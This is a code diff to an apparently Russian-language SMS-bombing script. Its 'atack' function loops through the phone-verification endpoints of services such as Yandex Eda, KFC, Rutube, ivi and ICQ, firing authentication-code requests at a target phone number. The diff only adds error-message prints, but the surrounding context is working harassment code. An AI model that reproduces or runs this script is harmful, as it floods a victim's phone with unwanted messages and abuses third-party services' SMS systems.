@@ -126,6 +126,7 @@ def atack():
         print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
         delay()
     except:
+        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
         pass
 
     try:
@@ -133,6 +134,7 @@ def atack():
         print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
         delay()
     except:
+        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
         pass
 
     try:
@@ -140,54 +142,63 @@ def atack():
         print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
         delay()
     except:
+        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
         pass
     try:
         a = requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + _phone})
         print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
         delay()
     except:
+        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
         pass
     try:
         a = requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", json={"phone": "+" + _phone})
         print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
         delay()
     except:
+        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
         pass
     try:
         a = requests.post("https://api.mtstv.ru/v1/users", json={"msisdn": _phone}, headers={})
         print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
         delay()
     except:
+        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
         pass
     try:
         a = requests.post("https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": _phone9}).json()["res"]
         print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
         delay()
     except:
+        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
         pass
     try:
         a = requests.post("https://rutube.ru/api/accounts/sendpass/phone", data={"phone": "+"+_phone})
         print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
         delay()
     except:
+        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
         pass
     try:
         a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
         print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
         delay()
     except:
+        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
         pass
     try:
         a = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
         print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))    
         delay()
     except:
+        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
         pass
     try:
         a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": _phone, "locale": "en", "countryCode": "ua", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
         print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
         delay()
     except:
+        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
         pass
     
 
